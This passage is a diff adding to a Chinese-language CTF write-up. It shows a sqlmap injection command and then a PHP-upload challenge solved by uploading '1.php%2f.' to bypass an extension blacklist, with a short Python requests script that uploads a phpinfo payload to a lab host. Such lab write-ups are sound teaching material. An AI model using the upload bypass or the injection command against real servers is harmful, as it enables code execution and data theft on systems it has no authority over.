@@ -35,3 +35,24 @@ sqlmap -u http://node4.anna.nssctf.cn:28513/query --data="id=1" --cookie="eyJyb2
 // 这里打印flag表flag列的内容，得到flag
 ```
 
+#### Round #2
+
+##### php签到
+
+题目：https://www.nssctf.cn/problem/4280
+
+参考：https://www.anquanke.com/post/id/253383
+
+一道有黑名单的文件上传题，php和phtml肯定是不能直接上传的，考虑文件解析漏洞，发现上传1.php/.可以实现绕过，解析原理应该是文件名提取是最后一个/和.的中间部分，文件后缀提取的是最后一个.后面的部分，但是在操作系统中这种文件名不符合规范，所以/.在传入成功之后会被删除，上传代码为
+
+```python
+import requests
+
+url = "http://node5.anna.nssctf.cn:28295"
+file_content = "<?php phpinfo();?>'"
+file = {"file": ("1.php%2f.", file_content)}
+response = requests.post(url, files=file)
+print(response.text)
+```
+
+之后访问1.php就可以查看phpinfo的内容，在其中找到flag。
